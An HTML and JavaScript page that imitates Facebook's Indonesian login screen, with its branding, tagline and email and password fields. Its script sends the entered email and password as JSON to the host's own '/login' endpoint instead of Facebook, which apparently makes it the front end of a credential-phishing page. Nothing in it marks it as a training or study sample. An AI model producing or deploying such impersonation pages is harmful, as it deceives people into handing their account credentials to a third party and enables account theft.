<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Masuk atau Daftar</title>
    <link href="./output.css" rel="stylesheet">
</head>

<body class="bg-gray-100 font-sans">
    <div class="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div class="max-w-6xl w-full flex items-center justify-between">
            <!-- Left Side - Facebook Logo and Description -->
            <div class="hidden lg:block lg:w-1/2 pr-16">
                <div class="text-blue-600 text-6xl font-bold mb-6">
                    facebook
                </div>
                <p class="text-2xl text-gray-800 font-normal leading-8">
                    Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.
                </p>
            </div>

            <!-- Right Side - Login Form -->
            <div class="w-full lg:w-1/2 max-w-md">
                <div class="bg-white rounded-lg shadow-lg p-8">
                    <!-- Success/Error Message -->
                    <div id="messageContainer" class="hidden mb-4">
                        <div id="messageBox" class="p-4 rounded-md">
                            <p id="messageText" class="text-sm font-medium"></p>
                        </div>
                    </div>

                    <!-- Mobile Logo (visible only on small screens) -->
                    <div class="lg:hidden text-center mb-8">
                        <div class="text-blue-600 text-4xl font-bold mb-4">
                            facebook
                        </div>
                        <p class="text-lg text-gray-800">
                            Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.
                        </p>
                    </div>

                    <!-- Login Form -->
                    <form id="loginForm" class="space-y-4">
                        <div>
                            <input type="email" id="email" name="email" placeholder="Email"
                                class="w-full px-4 py-3 border border-gray-300 rounded-md text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                                required>
                        </div>
                        <div>
                            <input type="password" id="password" name="password" placeholder="Kata Sandi"
                                class="w-full px-4 py-3 border border-gray-300 rounded-md text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                                required>
                        </div>
                        <div>
                            <button type="submit" id="loginBtn"
                                class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md text-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed">
                                <span id="loginBtnText">Masuk</span>
                                <span id="loadingSpinner" class="hidden">
                                    <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white inline"
                                        xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                            stroke-width="4"></circle>
                                        <path class="opacity-75" fill="currentColor"
                                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                        </path>
                                    </svg>
                                    Memproses...
                                </span>
                            </button>
                        </div>
                        <div class="text-center">
                            <a href="#" class="text-blue-600 hover:underline text-sm">
                                Lupa kata sandi?
                            </a>
                        </div>
                    </form>

                    <!-- Divider -->
                    <div class="my-6 border-t border-gray-300"></div>

                    <!-- Create New Account Button -->
                    <div class="text-center">
                        <button
                            class="bg-[#36a420] text-white font-semibold py-3 px-6 rounded-md transition duration-200">
                            Buat akun baru
                        </button>
                    </div>
                </div>

                <!-- Bottom Text -->
                <div class="text-center mt-6">
                    <p class="text-sm text-gray-600">
                        <a href="#" class="font-semibold text-gray-900 hover:underline">Buat Halaman</a>
                        untuk selebriti, merek, atau bisnis.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const loginBtn = document.getElementById('loginBtn');
            const loginBtnText = document.getElementById('loginBtnText');
            const loadingSpinner = document.getElementById('loadingSpinner');

            // Get form data
            const formData = new FormData(this);
            const loginData = {
                email: formData.get('email'),
                password: formData.get('password')
            };

            // Show loading state
            loginBtn.disabled = true;
            loginBtnText.classList.add('hidden');
            loadingSpinner.classList.remove('hidden');

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(loginData)
                });

                const result = await response.json();
                showMessage(result.message, result.success);

                if (result.success) {
                    console.log('Login successful:', result);
                    // Clear form after successful login
                    document.getElementById('loginForm').reset();
                }

            } catch (error) {
                console.error('Error:', error);
                showMessage('Terjadi kesalahan koneksi. Silakan coba lagi.', false);
            } finally {
                // Reset button state
                loginBtn.disabled = false;
                loginBtnText.classList.remove('hidden');
                loadingSpinner.classList.add('hidden');
            }
        });

        // Show message function
        function showMessage(message, isSuccess) {
            const messageContainer = document.getElementById('messageContainer');
            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageText');

            messageText.textContent = message;

            if (isSuccess) {
                messageBox.className = 'p-4 rounded-md bg-green-50 border border-green-200';
                messageText.className = 'text-sm font-medium text-green-800';
            } else {
                messageBox.className = 'p-4 rounded-md bg-red-50 border border-red-200';
                messageText.className = 'text-sm font-medium text-red-800';
            }

            messageContainer.classList.remove('hidden');

            // Auto hide after 5 seconds
            setTimeout(() => {
                messageContainer.classList.add('hidden');
            }, 5000);
        }
    </script>
</body>

</html>
